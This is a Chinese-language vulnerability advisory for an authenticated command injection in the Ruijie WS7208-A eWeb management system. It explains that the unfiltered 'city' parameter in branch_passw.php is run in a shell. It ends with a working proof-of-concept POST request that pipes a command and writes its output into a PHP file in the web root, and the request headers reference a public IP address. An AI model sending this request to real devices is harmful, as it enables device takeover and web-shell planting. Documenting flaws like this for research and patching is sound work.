# 锐捷 WS7208-A eWeb 网管系统 命令执行漏洞

## 漏洞概述

锐捷网络是一家提供交换机、路由器、安全设备及网络解决方案的专业厂商。其 WS7208-A 设备所使用的 eWeb 网管系统中存在一处命令执行漏洞。

攻击者在已登录系统的情况下，可通过构造恶意请求利用参数未进行安全过滤的问题，在服务器端执行任意系统命令，最终可能导致服务器权限被获取，设备完全失陷。

本漏洞为代码审计结果，不涉及互联网批量扫描或公开案例，文档内容仅用于安全研究与学习。

---

## 漏洞信息

- 漏洞类型：命令执行漏洞（Command Injection）
- 影响产品：锐捷 WS7208-A
- 影响系统：eWeb 网管系统
- 漏洞文件：/itbox_pi/branch_passw.php
- 触发条件：已登录后台
- 危害等级：高危
- 漏洞发现方式：代码审计

---

## 漏洞影响

攻击者成功利用该漏洞后，可能造成以下影响：

- 在服务器上执行任意系统命令
- 写入 WebShell 获取持久化控制
- 设备管理权限被完全接管
- 泄露设备配置及敏感信息
- 为后续内网横向攻击提供入口

---

## 漏洞位置

/itbox_pi/branch_passw.php

## 漏洞原理分析

在 `branch_passw.php` 文件的 `listAction()` 方法中，`city` 参数直接来源于用户请求，且未进行任何合法性校验或过滤处理。
该参数被直接拼接进系统命令，并通过 PHP 反引号语法执行。当参数中包含管道符、重定向符等 Shell 特殊字符时，可导致命令被注入并执行，从而形成命令执行漏洞。

## 本地复现

POST /itbox_pi/branch_passw.php?a=list HTTP/1.1
Host: 127.0.0.1
Cookie: LOCAL_LANG_COOKIE=zh; RUIJIEID=656v9k5tgud3cbml1b9u66pn93; user=admin; mac=c470.abe6.ad74
Content-Length: 28
Sec-Ch-Ua-Platform: "Windows"
Accept-Language: zh-CN,zh;q=0.9
Sec-Ch-Ua: "Chromium";v="137", "Not/A)Brand";v="24"
Sec-Ch-Ua-Mobile: ?0
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36
Accept: */*
Content-Type: application/x-www-form-urlencoded
Origin: https://61.162.225.232:4430
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://61.162.225.232:4430/cache.htm
Accept-Encoding: gzip, deflate, br
Priority: u=0, i
Connection: keep-alive

city=|echo `whoami`>../1.php

